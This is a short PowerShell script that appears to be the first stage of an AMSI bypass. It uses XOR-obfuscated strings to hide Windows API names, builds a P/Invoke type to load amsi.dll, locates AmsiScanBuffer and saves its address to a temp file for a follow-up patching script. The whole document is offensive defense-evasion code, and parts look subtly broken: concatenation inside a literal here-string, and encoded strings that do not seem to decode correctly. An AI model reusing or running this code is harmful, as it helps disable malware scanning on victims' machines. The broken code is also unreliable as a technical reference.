# Obfuscate String Decryption
Function Decode-String {
    param([string]$EncString)
    $Chars = $EncString.ToCharArray()
    for ($i = 0; $i -lt $Chars.Length; $i++) {
        $Chars[$i] = [char]([byte]$Chars[$i] -bxor 42)
    }
    return -join $Chars
}

# Obfuscated AMSI Function Names
$L = Decode-String "cgphrlkrr`fkc@brtfkq"
$P = Decode-String "FkgtUqrrz`fkc"

# Dynamic Type Creation
$AmsiLoader = @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
    public static extern IntPtr " + $P + @"(IntPtr module, string proc);
    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
    public static extern IntPtr " + $L + @"(string lib);
}
"@
Add-Type $AmsiLoader

# AMSI DLL Loading
$Lib = [AMSI]::($L)("amsi.dll")
$Addr = [AMSI]::($P)($Lib, "AmsiScanBuffer")

# Save Address for the Next Script
$Addr | Out-File "$env:TEMP\am_addr.txt" -Encoding ASCII
Write-Host "[*] AMSI Loader Initialized and Address Saved."
